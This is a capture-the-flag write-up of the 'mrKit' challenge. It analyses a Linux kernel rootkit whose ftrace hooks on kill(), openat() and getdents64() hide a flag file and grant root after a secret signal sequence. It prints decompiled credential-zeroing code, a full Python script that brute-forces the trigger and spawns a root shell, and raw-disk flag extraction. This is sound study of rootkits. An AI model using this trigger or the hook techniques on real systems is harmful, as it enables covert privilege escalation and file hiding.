---
layout: post
title: "0xmr: mrKit"
date: 2026-03-23 00:00:00 +0000
categories: [0xMR, Vanus-CTF-2026]
tags: [rootkit, kernel, ghidra, linux, ctf, syscall-hook, ftrace]
description: "mrKit rootkit challenge writeup: Analyzing a custom Linux kernel module with ftrace hooks for privilege escalation and file hiding, recovering the hidden flag."
excerpt: "In-depth analysis of the mrKit rootkit challenge, including reverse engineering of ftrace-based syscall hooks for kill(), openat(), and getdents64(), leading to privilege escalation and flag recovery."
media_subpath: /images/0xmr/mrkit
render_with_liquid: false
image:
  path: logo.png
---

The challenge gave us two files: `mrKit.ova` and `mrkit.ko`. A VM and a kernel module. I decided to look at the module first before touching the VM no point booting something suspicious without knowing what it does.

## Intended solution

```bash
$ file mrkit.ko
mrkit.ko: ELF 64-bit LSB relocatable, x86-64, version 1 (SYSV), BuildID[sha1]=e1f96ce2b9835e0975f10aa6d6206eb0f2e883f8, with debug_info, not stripped
```

ELF 64-bit relocatable, a Linux kernel module. I then ran `strings` and filtered for anything that looked interesting.

```bash
strings mrkit.ko | grep -E "cred|kill|getdents|openat"
```

![strings output](strings-output.png){: .shadow }

Seeing `prepare_creds`, `commit_creds`, `getdents64`, and `openat` together was a clear sign this module hooks syscalls and has some kind of privilege escalation built in. I opened it in Ghidra to understand exactly how.

![Ghidra overview](ghidra-before-login.png){: .shadow }

The entry point `mr_init` was straightforward it calls `fh_install_hooks(hooks, 3)`, installing three hooks via the ftrace framework. The interesting functions were `f2`, `f3`, and `f4`.

`f2` hooks `kill()`. Every `kill(pid, sig)` call gets checked against an XOR-encoded sequence:

```c
sequence[i] == (((int)param_1->di << 0x10 | (uint)param_1->si) ^ 0xa5b7c3d1)
```

If four consecutive calls match, the hook zeros all credential fields and calls `commit_creds` giving the process full root:

```c
*(undefined4 *)(lVar1 + 0x20) = 0;  // euid = 0
*(undefined4 *)(lVar1 + 0x18) = 0;  // uid  = 0
*(undefined8 *)(lVar1 + 8)    = 0;  // gid  = 0
*(undefined8 *)(lVar1 + 0x10) = 0;  // egid = 0
commit_creds(lVar1);
```

Any mismatch resets the counter to zero, so the sequence has to be sent consecutively without a wrong call in between.

![Ghidra f2 sequence and commit_creds](ghidra-f2-sequence-commit-creds.png){: .shadow }

`f3` hooks `openat()`. It reads the filename from userspace and if the file is opened read-only and the name matches a hidden string, it quietly returns `-2` (ENOENT):

```c
if (((int)uVar2 == 0) && (pcVar3 != (char *)0x0)) {
    lVar4 = -2;
    goto LAB_.text__0010010e;
}
```

So even if you know the exact filename, the file appears not to exist.

![Ghidra f3 openat](ghidra-f3-openat.png){: .shadow }

`f4` hooks `getdents64()`, which is what `ls` and `find` use internally. The hook lets the real syscall run first, then walks through the returned directory entries and removes any filename matching a 4-byte prefix:

```asm
MOV  RSI, DAT_00100559    ; hidden prefix
LEA  RDI, [RBX + 0x13]   ; dirent filename field
CALL strncmp
TEST EAX, EAX
JZ   LAB_hide_entry       ; match = splice it out
```

![Ghidra getdents splice](ghidra-getdents-splice.png){: .shadow }

I checked the `.rodata` section to find the actual strings being used:

```
00100540  "flag.txt"   <- f3 (openat hook)
00100559  "flag"       <- f4 (getdents64 hook)
```

![Ghidra rodata strings](ghidra-rodata-strings.png){: .shadow }

So there are two layers of protection. `f3` blocks you from opening `flag.txt` directly, and `f4` hides any file starting with `flag` from directory listings. You cannot see it and you cannot read it through normal means.

With that understood I booted the VM, logged in with the provided credentials, and run `id` to confirm I was `user` and not `root`.

![VM after login](vm-after-login.png){: .shadow }

Confirmed the module was loaded, and found its path on disk:

```bash
lsmod | grep mrkit
find /usr/lib/modules -name "mrkit.ko" 2>/dev/null
```

![lsmod output](vm-lsmod.png){: .shadow }
![find module path](vm-find-module.png){: .shadow }

Now for the exploit. The `sequence[]` values are embedded in the `.ko` binary — XOR each 4-byte word with `0xa5b7c3d1` and you get the encoded `(pid, sig)` pairs. I wrote a script with help from Claude that scans the binary for valid pairs and brute-forces all permutations of four until `euid` hits zero.

Copy-paste into the VM was not working so I served the script over HTTP from my host:

```bash
# on the host
python3 -m http.server 8080

# on the VM
wget http://<host-ip>:8080/mr-exploit.py
chmod +x mr-exploit.py
```

![wget exploit and chmod](wget-exploit-and-chmod.png){: .shadow }

```python
import struct
import os
import itertools

MODULE="/usr/lib/modules/6.8.0-101-generic/kernel/mrkit.ko"
KEY=0xa5b7c3d1

pairs=[]

with open(MODULE,"rb") as f:
    data=f.read()

for i in range(len(data)-4):
    val=struct.unpack("<I",data[i:i+4])[0]
    v=val^KEY
    pid=v>>16
    sig=v&0xffff

    if pid<40000 and sig<128:
        pairs.append((pid,sig))

pairs=list(set(pairs))

for combo in itertools.permutations(pairs,4):

    for pid,sig in combo:
        try:
            os.kill(pid,sig)
        except:
            pass

    if os.geteuid()==0:
        print("[+] ROOT SHELL")
        os.system("/bin/bash")
        break
```

Running it gave root. The UBSAN warning in the output was actually a good sign it meant the sequence hit the array boundary and the trigger fired. From there I tried `ls` but of course the flag was still hidden since the hooks were still active. So I went straight to the raw disk instead:

```bash
strings /dev/sda | grep 0xmr{
```

![exploit run id root flag](run-exploit-grep-flag.png){: .shadow }

The rootkit hooks syscalls but it cannot do anything about raw block device reads. The flag was right there.

```
0xmr{mrk1t_r00tk1t_i5_h4ck3d}
```

## Unintended Solution

I also found that you can skip the VM entirely by mounting the disk image directly on the host. Since the kernel module never loads, none of the hooks are active and everything is visible.

```bash
tar xf mrKit.ova
guestmount -a vmKit-disk001.vmdk -i --ro /mnt/vm
```

![extract and mount](guestmount-extract.png){: .shadow }

![mounted filesystem](guestmount-files.png){: .shadow }

Browsing to `/root/` in Thunar showed `flag.txt` sitting there with no hiding, no blocking nothing.

![flag.txt open](guestmount-flag.png){: .shadow }
